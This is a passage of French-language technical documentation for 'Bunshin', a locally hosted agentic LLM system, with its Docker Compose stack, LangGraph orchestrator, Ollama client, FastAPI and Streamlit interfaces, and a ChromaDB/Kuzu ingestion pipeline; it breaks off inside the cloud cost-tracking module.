# 🏯 Bunshin (分身) — Documentation Maître v2.5

> **Architecture** : Système Agentique Souverain avec Orchestration Hybride et Optimisation RAM.
> **Cible matérielle** : MSI Ryzen 7 7730U · 16 Go RAM · Mode CPU-only.

---

## 📋 Table des matières

1. [Vision & Stratégie](#1-vision--stratégie)
2. [Arborescence du projet](#2-arborescence-du-projet)
3. [Schéma de flux](#3-schéma-de-flux--cycle-de-vie-dune-requête)
4. [Décision architecturale — Images UI](#4-décision-architecturale--images-ui)
5. [Infrastructure Docker](#5-infrastructure-docker)
6. [Noyau décisionnel](#6-noyau-décisionnel-core)
7. [Interface utilisateur](#7-interface-utilisateur-ui)
8. [Mémoire RAG & Graphe](#8-mémoire-rag--graphe-memory)
9. [Module Cloud Bursting](#9-module-cloud-bursting-cloud)
10. [Sécurité & Anonymisation](#10-sécurité--anonymisation-safety)
11. [Agents Factory](#11-agents-factory-agents_factory)
12. [Initialisation (`setup.sh`)](#12-initialisation-setupsh)
13. [Configuration (`.env.example`)](#13-configuration-envexample)
14. [Dépendances](#14-dépendances)
15. [Modes d'exécution des agents](#15-modes-dexécution-des-agents)
16. [Tests](#16-tests)
17. [Guide de démarrage rapide](#17-guide-de-démarrage-rapide)
18. [Historique des corrections](#18-historique-des-corrections)
19. [Checklist de validation](#19-checklist-de-validation)

---

## 1. Vision & Stratégie

Bunshin maximise l'intelligence locale sur 16 Go de RAM tout en disposant d'une soupape Cloud pour les surcharges.

| Principe         | Décision technique                                             | Gain RAM estimé                |
| :--------------- | :------------------------------------------------------------- | :----------------------------- |
| **Souveraineté** | Inférence locale via Ollama + `KEEP_ALIVE=0`                   | ~5.5 Go libérés entre requêtes |
| **Légèreté**     | Kuzu DB embarqué (remplace Neo4j)                              | ~1.3 Go                        |
| **Légèreté**     | Diskcache sur disque (remplace Redis)                          | ~0.3 Go                        |
| **Séquençage**   | `MAX_CONCURRENT_AGENTS=1` via `asyncio.Semaphore`              | Évite les pics cumulés         |
| **Élasticité**   | Cloud Bursting AES-256 si RAM libre < 1 Go + retry exponentiel | —                              |
| **Résilience**   | `AGENT_TIMEOUT=45` + `finally` kill containers Docker          | Zéro container zombie          |

---

## 2. Arborescence du projet

```
/Bunshin/
├── docker-compose.yml
├── .env                         # ⚠️ Ne jamais commiter (RUNPOD_API_KEY + ENCRYPTION_KEY)
├── .env.example
├── .gitignore                   # NEW v2.5 : contenu complet fourni en section 2.1
├── pytest.ini
├── requirements.txt
├── requirements-host.txt
├── setup.sh                     # NEW v2.5 : crée les __init__.py + .gitignore check
│
├── core/
│   ├── __init__.py              # NEW v2.5 : contenu fourni
│   ├── orchestrator.py
│   ├── brain.py
│   └── resource_monitor.py
│
├── ui/
│   ├── __init__.py
│   ├── Dockerfile.api
│   ├── Dockerfile.streamlit
│   ├── app.py
│   └── api_rest.py
│
├── agents_factory/
│   ├── __init__.py
│   ├── generator.py
│   └── executor.py
│
├── memory/
│   ├── __init__.py
│   ├── graph_store/
│   ├── vector_store/
│   ├── cache/
│   └── ingest_pipeline.py      # NEW v2.5 : code source complet fourni
│
├── cloud/
│   ├── __init__.py
│   ├── bridge.py
│   ├── cost_tracker.py          # NEW v2.5 : code source complet fourni
│   └── providers/
│       ├── __init__.py
│       ├── base.py
│       └── runpod_adapter.py
│
├── safety/
│   ├── __init__.py
│   ├── code_scanner.py
│   └── de_identifier.py
│
└── tests/
    ├── __init__.py
    ├── unit/
    │   ├── __init__.py
    │   ├── test_brain.py               # NEW v2.5 : code source complet fourni
    │   ├── test_orchestrator_nodes.py
    │   ├── test_cost_tracker.py        # NEW v2.5 : code source complet fourni
    │   ├── test_ingest.py              # NEW v2.5 : code source complet fourni
    │   ├── test_code_scanner.py        # NEW v2.5 : code source complet fourni
    │   ├── test_resource_monitor.py    # NEW v2.5 : code source complet fourni
    │   └── test_runpod_adapter.py
    └── security/
        ├── __init__.py
        └── test_sandbox_escape.py      # NEW v2.5 : code source complet fourni
```

> ⚠️ Les `__init__.py` sont **obligatoires** dans chaque dossier pour que Python les reconnaisse comme des packages. Sans eux, tous les `import core.brain`, `import cloud.bridge`, etc. lèvent un `ModuleNotFoundError`. Le `setup.sh` v2.5 les crée automatiquement.

### 2.1 `.gitignore` (contenu complet — NEW v2.5)

```gitignore
# Secrets
.env

# Mémoire persistée (volumes Docker)
memory/graph_store/
memory/vector_store/
memory/cache/

# Logs & snapshots
logs/
workspace/

# Python
__pycache__/
*.py[cod]
*.pyo
*.pyd
.Python
*.egg-info/
dist/
build/
*.egg

# Tests
.pytest_cache/
.coverage
htmlcov/

# Environnements virtuels
.venv/
venv/
env/

# IDE
.idea/
.vscode/
*.swp
*.swo

# OS
.DS_Store
Thumbs.db
```

### 2.2 `__init__.py` — tous les packages (NEW v2.5)

Chaque fichier `__init__.py` est **vide** (fichier de 0 octet). Leur seule fonction est de déclarer le répertoire comme un package Python. Le `setup.sh` v2.5 les crée avec `touch`. Si vous les créez manuellement :

```bash
# Créer tous les __init__.py d'un coup (depuis la racine du projet)
touch core/__init__.py
touch ui/__init__.py
touch agents_factory/__init__.py
touch memory/__init__.py
touch cloud/__init__.py
touch cloud/providers/__init__.py
touch safety/__init__.py
touch tests/__init__.py
touch tests/unit/__init__.py
touch tests/security/__init__.py
```

---

## 3. Schéma de flux : Cycle de vie d'une requête

```mermaid
flowchart TD
    A([👤 Prompt utilisateur\nStreamlit / API REST]) --> SEM[asyncio.Semaphore\nMAX_CONCURRENT_AGENTS=1]
    SEM --> CC[cloud_check_node\nNEW v2.3]
    CC --> RAM{RAM libre > 1 Go\nOU CLOUD_ENABLED=false ?}

    RAM -- NON --> CLOUD[☁️ Cloud Bursting]
    CLOUD --> C0[Snapshot Kuzu → kuzu_snapshot.json]
    C0 --> C1[Gel state LangGraph → JSON]
    C1 --> C2[de_identifier.py\nAnonymisation Presidio]
    C2 --> C3[bridge.py\nChiffrement AES-256\nTable Fernet → RAM]
    C3 --> C4[RunPodAdapter.send_task_safe()\nGarde-fou : coût/requête ≤ CLOUD_COST_LIMIT_USD]
    C4 --> C5[poll_until_done()\nPolling /status/id toutes 2s\nRetry exponentiel si failed]
    C5 --> C6[Déchiffrement + ré-identification\nfinally: suppression table + snapshot]
    C6 --> C7[cost_tracker.log_cost()\n→ cloud_costs.jsonl]
    C7 --> OUT

    RAM -- OUI --> LOCAL[🧠 brain.py\nOllama llama3:8b-q4]
    LOCAL --> PLAN[plan_node]
    PLAN --> EXEC[execute_node\ngenerator.py + executor.py]
    EXEC --> VERIFY[verify_node\nmax 2 retries]
    VERIFY --> OUT([✅ Résultat → UI])

    style CLOUD fill:#dc2626,color:#fff
    style OUT fill:#16a34a,color:#fff
    style CC fill:#7c3aed,color:#fff
    style LOCAL fill:#0369a1,color:#fff
```

---

## 4. Décision architecturale — Images UI

| Option                          | Avantages                                               | Inconvénients                                 | RAM estimée |
| :------------------------------ | :------------------------------------------------------ | :-------------------------------------------- | :---------- |
| **A — Deux images séparées** ✅ | Isolation totale, healthcheck précis, redémarrage ciblé | Deux builds                                   | ~360 Mo     |
| **B — `supervisor`**            | Un seul build                                           | Si Streamlit crash, FastAPI reste sans raison | ~200 Mo     |
| **C — `honcho`**                | Simple Procfile                                         | Supervision partielle                         | ~190 Mo     |

**Décision retenue : Option A.** Sur 16 Go de RAM, la différence est négligeable. L'isolation garantit des logs séparés et un healthcheck fiable par service.

---

## 5. Infrastructure Docker

> ⚠️ **Docker Compose v2 requis.** Commande : `docker compose` (sans tiret). `setup.sh` vérifie la version au démarrage.

### `docker-compose.yml`

```yaml
services:
  chromadb:
    image: chromadb/chroma:latest
    restart: unless-stopped
    volumes:
      - ./memory/vector_store:/index_data
    ports:
      - "8001:8000"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/api/v1/heartbeat"]
      interval: 15s
      timeout: 5s
      retries: 3
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  ollama:
    image: ollama/ollama:latest
    restart: unless-stopped
    ports:
      - "11434:11434"
    volumes:
      - ollama_models:/root/.ollama
    environment:
      - OLLAMA_KEEP_ALIVE=0
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:11434/api/tags"]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 20s
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  fastapi_backend:
    build:
      context: . # Racine — accès à core/, memory/, safety/, cloud/
      dockerfile: ui/Dockerfile.api
    restart: unless-stopped
    ports:
      - "8000:8000"
    depends_on:
      chromadb:
        condition: service_healthy
      ollama:
        condition: service_healthy
    env_file: .env
    volumes:
      - ./memory/graph_store:/app/memory/graph_store
      - ./memory/cache:/app/memory/cache
      - ./logs:/app/logs
      - ./workspace:/app/workspace
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
      interval: 15s
      timeout: 5s
      retries: 3
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  streamlit_ui:
    build:
      context: ./ui
      dockerfile: Dockerfile.streamlit
    restart: unless-stopped
    ports:
      - "3000:3000"
    depends_on:
      fastapi_backend:
        condition: service_healthy
    volumes:
      - ./workspace:/app/workspace
      - ./logs:/app/logs
    env_file: .env
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

volumes:
  ollama_models:
```

### Référence des ports

| Service      | Port hôte | Port interne | Accès                          |
| :----------- | :-------- | :----------- | :----------------------------- |
| Streamlit UI | 3000      | 3000         | http://localhost:3000          |
| FastAPI      | 8000      | 8000         | http://localhost:8000/docs     |
| ChromaDB     | 8001      | 8000         | http://localhost:8001 (debug)  |
| Ollama       | 11434     | 11434        | http://localhost:11434 (debug) |

> ℹ️ Communications **inter-conteneurs** : utiliser le nom du service Docker + port interne (ex: `http://chromadb:8000`). Les ports hôtes ne sont pas résolvables à l'intérieur du réseau Docker.

---

## 6. Noyau décisionnel (`core/`)

### `orchestrator.py` — Graphe LangGraph v2.4 (code complet)

```python
import asyncio
import json
import logging
import os
from dataclasses import dataclass, asdict
from typing import Literal

from langgraph.graph import StateGraph, END

from agents_factory.generator import generate_script
from agents_factory.executor  import execute_script
from core.brain               import query as brain_query
from core.resource_monitor    import should_offload_to_cloud

logger = logging.getLogger(__name__)

AGENT_TIMEOUT         = int(os.getenv("AGENT_TIMEOUT", 45))
MAX_CONCURRENT_AGENTS = int(os.getenv("MAX_CONCURRENT_AGENTS", 1))
MAX_RETRIES           = 2
CLOUD_ENABLED         = os.getenv("CLOUD_ENABLED", "true").lower() == "true"

_semaphore = asyncio.Semaphore(MAX_CONCURRENT_AGENTS)


@dataclass
class AgentState:
    prompt:      str
    plan:        str        = ""
    script:      str        = ""
    mode:        str        = "light"
    result:      str | None = None
    error:       str | None = None
    retry_count: int        = 0
    verified:    bool       = False


async def cloud_check_node(state: AgentState) -> AgentState:
    if not CLOUD_ENABLED:
        logger.info("cloud_check_node : Cloud désactivé → chemin local.")
        return state
    if not should_offload_to_cloud():
        logger.debug("cloud_check_node : RAM suffisante → chemin local.")
        return state
    logger.warning("cloud_check_node : RAM critique → tentative Cloud Bursting.")
    try:
        from cloud.bridge import offload
        state_json   = json.dumps(asdict(state), ensure_ascii=False)
        cloud_result = offload(state_json)
        if cloud_result.startswith("CLOUD_ERROR:"):
            logger.error(f"cloud_check_node : {cloud_result} → fallback local.")
            return AgentState(**{**asdict(state), "error": None})
        return AgentState(**{**asdict(state), "result": cloud_result,
                             "verified": True, "error": None})
    except ImportError as e:
        logger.error(f"cloud_check_node : ImportError ({e}) → fallback local.")
        return AgentState(**{**asdict(state), "error": None})
    except Exception as e:
        logger.exception(f"cloud_check_node : erreur inattendue ({e}) → fallback local.")
        return AgentState(**{**asdict(state), "error": None})


def route_after_cloud_check(state: AgentState) -> Literal["plan", "end"]:
    return "end" if state.verified else "plan"


def plan_node(state: AgentState) -> AgentState:
    plan = brain_query(
        f"Décompose cette tâche en UNE seule instruction Python exécutable.\n"
        f"Tâche : {state.prompt}\nRéponds avec UN seul verbe d'action + objet."
    )
    if plan.startswith("BRAIN_ERROR:"):
        logger.error(f"plan_node : {plan}")
        return AgentState(**{**asdict(state), "error": plan, "plan": ""})
    return AgentState(**{**asdict(state), "plan": plan, "error": None})


async def execute_node(state: AgentState) -> AgentState:
    if state.error:
        return state
    try:
        result = await asyncio.wait_for(_run_agent(state), timeout=AGENT_TIMEOUT)
        return AgentState(**{**asdict(state), "result": result, "error": None})
    except asyncio.TimeoutError:
        logger.error(f"execute_node : timeout après {AGENT_TIMEOUT}s")
        return AgentState(**{**asdict(state), "result": None, "error": "timeout"})


async def _run_agent(state: AgentState) -> str:
    script_code, mode = generate_script(state.plan, context={})
    return await execute_script(script_code, mode)


def verify_node(state: AgentState) -> AgentState:
    result = state.result or ""
    if state.error or result.startswith("ERROR:") or result.strip() == "":
        if state.retry_count < MAX_RETRIES:
            logger.warning(f"verify_node : retry {state.retry_count + 1}/{MAX_RETRIES}")
            return AgentState(**{**asdict(state), "retry_count": state.retry_count + 1,
                                 "result": None, "error": None, "verified": False})
        logger.error(f"verify_node : échec après {MAX_RETRIES} tentatives.")
        return AgentState(**{**asdict(state),
                             "result": f"[DÉGRADÉ] Impossible de compléter : {state.error or 'résultat vide'}",
                             "verified": False})
    return AgentState(**{**asdict(state), "verified": True})


def route_after_verify(state: AgentState) -> Literal["retry", "end"]:
    """FIX v2.2 — Comparaison stricte < MAX_RETRIES (évite la boucle infinie)."""
    if not state.verified and state.retry_count < MAX_RETRIES:
        return "retry"
    return "end"


def build_graph():
    graph = StateGraph(AgentState)
    graph.add_node("cloud_check", cloud_check_node)
    graph.add_node("plan",        plan_node)
    graph.add_node("execute",     execute_node)
    graph.add_node("verify",      verify_node)
    graph.set_entry_point("cloud_check")
    graph.add_conditional_edges("cloud_check", route_after_cloud_check,
                                {"plan": "plan", "end": END})
    graph.add_edge("plan",    "execute")
    graph.add_edge("execute", "verify")
    graph.add_conditional_edges("verify", route_after_verify,
                                {"retry": "plan", "end": END})
    return graph.compile()


_graph = build_graph()


async def run(prompt: str) -> str:
    async with _semaphore:
        final_state = await _graph.ainvoke(AgentState(prompt=prompt))
        return final_state.result or "[Aucun résultat]"
```

### `brain.py` — Client Ollama

```python
import logging
import os
from ollama import Client as OllamaClient, ResponseError

logger          = logging.getLogger(__name__)
OLLAMA_HOST     = os.getenv("OLLAMA_HOST", "http://ollama:11434")
INFERENCE_MODEL = os.getenv("INFERENCE_MODEL", "llama3:8b-instruct-q4_K_M")

_client: OllamaClient | None = None


def _get_client() -> OllamaClient:
    global _client
    if _client is None:
        _client = OllamaClient(host=OLLAMA_HOST)
    return _client


def query(prompt: str, model: str | None = None) -> str:
    _model = model or INFERENCE_MODEL
    try:
        response = _get_client().chat(
            model=_model,
            messages=[{"role": "user", "content": prompt}]
        )
        return response["message"]["content"].strip()
    except ConnectionError:
        logger.error(f"Ollama inaccessible sur {OLLAMA_HOST}")
        return "BRAIN_ERROR: Ollama non accessible"
    except ResponseError as e:
        if e.status_code == 404:
            return f"BRAIN_ERROR: Modèle {_model} non disponible"
        return f"BRAIN_ERROR: {e}"
    except Exception as e:
        logger.exception("Erreur inattendue dans brain.query()")
        return f"BRAIN_ERROR: {e}"


def reset_client() -> None:
    global _client
    _client = None
```

### `resource_monitor.py`

```python
import psutil


def get_free_ram_gb() -> float:
    return psutil.virtual_memory().available / (1024 ** 3)


def should_offload_to_cloud() -> bool:
    """True si RAM libre < 1 Go (seuil critique sur 16 Go)."""
    return get_free_ram_gb() < 1.0


def get_ram_status() -> dict:
    mem = psutil.virtual_memory()
    return {
        "total_gb":         round(mem.total / (1024 ** 3), 1),
        "free_gb":          round(mem.available / (1024 ** 3), 2),
        "used_percent":     mem.percent,
        "offload_required": should_offload_to_cloud(),
    }
```

---

## 7. Interface utilisateur (`ui/`)

### `api_rest.py` — Endpoints FastAPI (code complet)

```python
import asyncio
import logging
import os

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

logger = logging.getLogger(__name__)

app = FastAPI(title="Bunshin API", version="2.5")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000", "http://streamlit_ui:3000"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class ChatRequest(BaseModel):
    prompt: str


class IngestRequest(BaseModel):
    file_path: str
    mode:      str  = "hybrid"
    dry_run:   bool = False


@app.get("/health")
def health():
    return {"status": "ok"}


@app.get("/ram")
def ram_status():
    from core.resource_monitor import get_ram_status
    return get_ram_status()


@app.get("/cost")
def cost():
    from cloud.cost_tracker import get_total_cost
    return {"total_usd": get_total_cost()}


@app.post("/chat")
async def chat(payload: ChatRequest):
    from core.orchestrator import run as orchestrator_run
    result = await orchestrator_run(payload.prompt)
    return {"response": result}


@app.post("/ingest")
async def ingest(payload: IngestRequest):
    from memory.ingest_pipeline import ingest as run_ingest
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(
        None, run_ingest, payload.file_path, payload.mode, payload.dry_run
    )
    return {"status": "ok", "file": payload.file_path, "dry_run": payload.dry_run}


@app.post("/reset")
def reset():
    import shutil
    shutil.rmtree("./memory/vector_store", ignore_errors=True)
    shutil.rmtree("./memory/graph_store",  ignore_errors=True)
    os.makedirs("./memory/vector_store", exist_ok=True)
    os.makedirs("./memory/graph_store",  exist_ok=True)
    return {"status": "reset_ok"}
```

### Tableau des endpoints

| Méthode | Route     | Description                                    |
| :------ | :-------- | :--------------------------------------------- |
| GET     | `/health` | Liveness probe Docker                          |
| GET     | `/ram`    | Métriques RAM (total, libre, offload_required) |
| GET     | `/cost`   | Coût Cloud cumulatif en USD                    |
| POST    | `/chat`   | Envoie un prompt à l'orchestrateur             |
| POST    | `/ingest` | Ingestion document (file_path, mode, dry_run)  |
| POST    | `/reset`  | Vide ChromaDB + Kuzu                           |

### `app.py` — Dashboard Streamlit (code complet)

```python
"""Bunshin v2.5 — Dashboard Streamlit"""
import glob
import os

import requests
import streamlit as st

API_BASE = os.getenv("API_BASE_URL", "http://fastapi_backend:8000")

st.set_page_config(page_title="🏯 Bunshin v2.5", layout="wide",
                   initial_sidebar_state="collapsed")

st.markdown("""
<style>
  .block-container { padding-top: 1rem; }
  .ram-bar  { height: 14px; border-radius: 7px; background: #e5e7eb; margin-top: 4px; }
  .ram-fill { height: 14px; border-radius: 7px; }
</style>
""", unsafe_allow_html=True)

st.title("🏯 Bunshin Dashboard v2.5")

col_chat, col_monitor = st.columns([3, 2], gap="large")

with col_chat:
    st.subheader("💬 Chat")

    if "history" not in st.session_state:
        st.session_state.history = []

    for msg in st.session_state.history:
        icon = "🧑" if msg["role"] == "user" else "🤖"
        st.markdown(f"**{icon}** {msg['content']}")

    with st.form("chat_form", clear_on_submit=True):
        user_input = st.text_area("Votre question :", height=80,
                                   placeholder="Ex : Trie le fichier CSV par date")
        submitted = st.form_submit_button("Envoyer ▶")

    if submitted and user_input.strip():
        st.session_state.history.append({"role": "user", "content": user_input})
        with st.spinner("Réflexion en cours…"):
            try:
                resp = requests.post(f"{API_BASE}/chat",
                                     json={"prompt": user_input}, timeout=60)
                resp.raise_for_status()
                answer = resp.json().get("response", "[Pas de réponse]")
            except requests.exceptions.ConnectionError:
                answer = "❌ Impossible de contacter l'API FastAPI."
            except requests.exceptions.HTTPError as e:
                answer = f"❌ Erreur API : {e}"
        st.session_state.history.append({"role": "assistant", "content": answer})
        st.rerun()

    st.divider()
    st.subheader("📄 Ingestion de document")

    with st.form("ingest_form"):
        file_path  = st.text_input("Chemin du fichier (/workspace/input/) :",
                                    placeholder="./workspace/input/rapport.pdf")
        mode       = st.selectbox("Mode :", ["hybrid", "vector", "graph"])
        dry_run    = st.checkbox("Dry-run (affiche les chunks sans persister)")
        ingest_btn = st.form_submit_button("Ingérer 📥")

    if ingest_btn and file_path:
        with st.spinner("Ingestion en cours…"):
            try:
                r = requests.post(f"{API_BASE}/ingest",
                                  json={"file_path": file_path,
                                        "mode": mode, "dry_run": dry_run},
                                  timeout=120)
                r.raise_for_status()
                st.success(f"✅ {r.json()}")
            except Exception as e:
                st.error(f"❌ {e}")

with col_monitor:
    st.subheader("📊 Monitoring RAM")

    if st.button("🔄 Rafraîchir"):
        st.rerun()

    try:
        ram      = requests.get(f"{API_BASE}/ram", timeout=5).json()
        total    = ram.get("total_gb", 16)
        free     = ram.get("free_gb", 0)
        used_pct = int(ram.get("used_percent", 0))
        offload  = ram.get("offload_required", False)
        color    = "#dc2626" if used_pct > 90 else "#f59e0b" if used_pct > 75 else "#0369a1"
        st.markdown(
            f'<div class="ram-bar">'
            f'<div class="ram-fill" style="width:{used_pct}%;background:{color}"></div>'
            f'</div>',
            unsafe_allow_html=True,
        )
        st.caption(f"Libre : **{free} Go** / {total} Go — Utilisé : {used_pct}%")
        st.metric("Cloud Bursting", "🔴 ON" if offload else "🟢 OFF")
    except Exception as e:
        st.warning(f"API inaccessible : {e}")

    st.divider()
    try:
        cost_data  = requests.get(f"{API_BASE}/cost", timeout=5).json()
        total_cost = cost_data.get("total_usd", 0.0)
        st.metric("💸 Coût Cloud cumulatif", f"${total_cost:.4f} USD")
    except Exception:
        st.caption("💸 Coût Cloud : indisponible")

    st.divider()
    st.subheader("📋 Logs Safety")

    log_files = sorted(glob.glob("./logs/*.log"), reverse=True)[:3]
    if log_files:
        for lf in log_files:
            try:
                with open(lf) as fh:
                    lines = fh.readlines()[-20:]
                st.code("".join(lines), language="text")
            except Exception:
                pass
    else:
        st.info("Aucun log disponible pour l'instant.")

    st.divider()
    st.subheader("🔄 Reset mémoire")
    if st.button("⚠️ Vider ChromaDB + Kuzu", type="secondary"):
        try:
            r = requests.post(f"{API_BASE}/reset", timeout=10)
            r.raise_for_status()
            st.success("✅ Mémoire réinitialisée.")
        except Exception as e:
            st.error(f"❌ {e}")
```

### `ui/Dockerfile.api`

```dockerfile
FROM python:3.11-slim
WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential curl libmagic1 \
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# spacy est dans requirements.txt → cette commande réussit
RUN python -m spacy download fr_core_news_md

# context: . (racine du projet) → accès à core/, memory/, safety/, cloud/
COPY . /app
EXPOSE 8000
CMD ["uvicorn", "ui.api_rest:app", "--host", "0.0.0.0", "--port", "8000"]
```

### `ui/Dockerfile.streamlit`

```dockerfile
FROM python:3.11-slim
WORKDIR /app

RUN pip install --no-cache-dir streamlit requests psutil

COPY app.py .
EXPOSE 3000

ENV STREAMLIT_SERVER_PORT=3000
ENV STREAMLIT_SERVER_ADDRESS=0.0.0.0
ENV STREAMLIT_SERVER_HEADLESS=true
ENV STREAMLIT_BROWSER_GATHER_USAGE_STATS=false

CMD ["streamlit", "run", "app.py", "--server.port=3000", "--server.address=0.0.0.0"]
```

---

## 8. Mémoire RAG & Graphe (`memory/`)

### Modèles

| Rôle       | Modèle                      | Variable `.env`   |
| :--------- | :-------------------------- | :---------------- |
| Inférence  | `llama3:8b-instruct-q4_K_M` | `INFERENCE_MODEL` |
| Embeddings | `nomic-embed-text`          | `EMBEDDING_MODEL` |

### `memory/ingest_pipeline.py` — Code source complet (NEW v2.5)

```python
"""
memory/ingest_pipeline.py
Pipeline d'ingestion hybride : Vector (ChromaDB) + Graphe (Kuzu).
FIX v2.2 : _embed_one() implémentée + import hashlib + dry_run.
NEW v2.4 : usage CLI hors Docker documenté.
"""
import argparse
import hashlib
import logging
import os
from datetime import datetime, timezone
from pathlib import Path

import diskcache
import ollama

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s: %(message)s")

CHROMA_HOST  = os.getenv("CHROMA_SERVER_HOST", "chromadb")
CHROMA_PORT  = int(os.getenv("CHROMA_SERVER_PORT", 8000))
KUZU_PATH    = os.getenv("KUZU_PATH", "./memory/graph_store")
CACHE_PATH   = os.getenv("CACHE_PATH", "./memory/cache")
OLLAMA_HOST  = os.getenv("OLLAMA_HOST", "http://ollama:11434")
EMBED_MODEL  = os.getenv("EMBEDDING_MODEL", "nomic-embed-text")
CACHE_TTL    = 60 * 60 * 24 * 30   # 30 jours

_cache: diskcache.Cache | None = None


def _get_cache() -> diskcache.Cache:
    global _cache
    if _cache is None:
        Path(CACHE_PATH).mkdir(parents=True, exist_ok=True)
        _cache = diskcache.Cache(CACHE_PATH)
    return _cache


def _embed_one(text: str) -> list[float]:
    """Cache MD5 + Diskcache TTL 30j — zéro ré-embedding."""
    key    = "emb_" + hashlib.md5(text.encode("utf-8")).hexdigest()
    cache  = _get_cache()
    cached = cache.get(key)
    if cached is not None:
        return cached
    client    = ollama.Client(host=OLLAMA_HOST)
    response  = client.embeddings(model=EMBED_MODEL, prompt=text)
    embedding = response["embedding"]
    cache.set(key, embedding, expire=CACHE_TTL)
    return embedding


def _load_chunks(file_path: str) -> list[str]:
    path   = Path(file_path)
    suffix = path.suffix.lower()
    if suffix == ".pdf":
        try:
            from unstructured.partition.pdf import partition_pdf
            elements = partition_pdf(filename=str(path))
            chunks   = [str(e).strip() for e in elements if str(e).strip()]
        except ImportError:
            logger.warning("unstructured[pdf] non installé — fallback lecture brute.")
            text   = path.read_bytes().decode("utf-8", errors="replace")
            chunks = [text[i:i + 800] for i in range(0, len(text), 800)]
    elif suffix in (".md", ".txt"):
        text       = path.read_text(encoding="utf-8")
        paragraphs = [p.strip() for p in text.split("\n\n") if p.strip()]
        chunks     = paragraphs if paragraphs else [text]
    else:
        text   = path.read_text(encoding="utf-8", errors="replace")
        chunks = [text[i:i + 800] for i in range(0, len(text), 800)]
    return [c for c in chunks if c]


def _extract_entities(text: str) -> list[dict]:
    try:
        import spacy
        nlp = spacy.load("fr_core_news_md")
        doc = nlp(text[:4000])
        return [{"label": ent.label_, "text": ent.text} for ent in doc.ents]
    except Exception as e:
        logger.debug(f"_extract_entities : {e}")
        return []


def ingest(file_path: str, mode: str = "hybrid", dry_run: bool = False) -> None:
    logger.info(f"ingest : {file_path} | mode={mode} | dry_run={dry_run}")
    path   = Path(file_path)
    chunks = _load_chunks(str(path))
    doc_id = hashlib.md5(file_path.encode()).hexdigest()

    if dry_run:
        logger.info(f"[DRY-RUN] {len(chunks)} chunks détectés — rien persisté.")
        for i, chunk in enumerate(chunks[:5]):
            logger.info(f"  Chunk {i + 1}: {chunk[:120]}…")
        return

    if mode in ("vector", "hybrid"):
        try:
            import chromadb
            client     = chromadb.HttpClient(host=CHROMA_HOST, port=CHROMA_PORT)
            collection = client.get_or_create_collection("bunshin")
            embeddings = [_embed_one(c) for c in chunks]
            ids        = [f"{doc_id}_{i}" for i in range(len(chunks))]
            metadatas  = [{"source": file_path, "chunk": i} for i in range(len(chunks))]
            collection.add(ids=ids, embeddings=embeddings,
                           documents=chunks, metadatas=metadatas)
            logger.info(f"ChromaDB : {len(chunks)} chunks ingérés.")
        except Exception as e:
            logger.error(f"ChromaDB ingest : {e}")

    if mode in ("graph", "hybrid"):
        try:
            import kuzu
            db   = kuzu.Database(KUZU_PATH)
            conn = kuzu.Connection(db)
            now  = datetime.now(timezone.utc).isoformat()
            conn.execute(
                "MERGE (d:Document {id: $id}) SET d.title = $title, d.ingested_at = $ts",
                {"id": doc_id, "title": path.stem, "ts": now},
            )
            for chunk in chunks:
                for ent in _extract_entities(chunk):
                    eid = hashlib.md5(
                        f"{ent['label']}_{ent['text']}".encode()
                    ).hexdigest()
                    conn.execute(
                        "MERGE (e:Entity {id: $id}) SET e.label = $label",
                        {"id": eid, "label": ent["text"]},
                    )
                    conn.execute(
                        "MATCH (d:Document {id: $did}), (e:Entity {id: $eid}) "
                        "MERGE (d)-[:MENTIONS]->(e)",
                        {"did": doc_id, "eid": eid},
                    )
            logger.info("Kuzu : Document + entités persistés.")
        except Exception as e:
            logger.error(f"Kuzu ingest : {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bunshin Ingest Pipeline v2.5")
    parser.add_argument("--file",    required=True)
    parser.add_argument("--mode",    default="hybrid",
                        choices=["vector", "graph", "hybrid"])
    parser.add_argument("--dry-run", action="store_true", dest="dry_run")
    args = parser.parse_args()
    ingest(args.file, args.mode, args.dry_run)
```

### Cache Diskcache — zéro ré-embedding

Clé = MD5 du chunk. TTL = 30 jours. Stocké dans `memory/cache/` — zéro RAM occupée entre sessions.

### Commandes CLI

```bash
# Depuis Docker (recommandé — accès à chromadb via réseau Docker)
docker compose exec fastapi_backend python memory/ingest_pipeline.py \
  --file /app/workspace/input/rapport.pdf --mode hybrid

# Depuis l'hôte (hors Docker)
# ⚠️ ChromaDB écoute sur le port HÔTE 8001, pas 8000
CHROMA_SERVER_HOST=localhost \
CHROMA_SERVER_PORT=8001 \
OLLAMA_HOST=http://localhost:11434 \
python memory/ingest_pipeline.py --file ./workspace/input/notes.md --mode vector

# Dry-run (affiche chunks + entités sans persister)
python memory/ingest_pipeline.py --file ./workspace/input/test.pdf --mode hybrid --dry-run
```

> ⚠️ **Migration Kuzu** : aucune procédure automatique. Si le schéma évolue, reset complet requis (`docker compose down -v` + suppression `memory/graph_store/`).

---

## 9. Module Cloud Bursting (`cloud/`)

### `cloud/cost_tracker.py` — Code source complet (NEW v2.5)

```python
"""
cloud/cost_tracker.py
Journalise chaque appel Cloud Bursting dans logs/cloud_costs.jsonl.
Fournit get_total_cost() lu par GET /cost (api_rest.py).
"""
import json
import logging
import os
from datetime import datetime, timezone
from pathlib import Path

logger    = logging.getLogger(__name__)
LOG_DIR   = Path(os.getenv("LOG_DIR", "./logs"))
COST_FILE = LOG_DIR / "cloud_costs.jsonl"


def log_cost(task_id: str, cost_usd: float) -> None:
    """
